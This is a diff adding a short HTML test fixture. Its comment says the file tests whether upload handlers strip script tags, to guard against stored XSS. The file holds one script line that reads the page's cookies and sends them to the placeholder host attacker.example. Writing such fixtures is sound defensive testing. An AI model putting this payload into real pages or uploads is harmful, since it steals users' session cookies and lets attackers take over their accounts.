@@ -1,0 +1,10 @@
+<!-- INERT FIXTURE — DO NOT RENDER IN A BROWSER OR SERVE AS text/html
+     Purpose: tests that upload handlers reject or strip <script> tags from HTML file content.
+     Threat: stored XSS — if this file is stored and served as text/html to other users, the
+     script executes in their browser session. -->
+<html>
+<body>
+<p>Legitimate-looking document content.</p>
+<script>document.cookie = 'stolen=' + document.cookie; fetch('https://attacker.example/?c=' + document.cookie);</script>
+</body>
+</html>
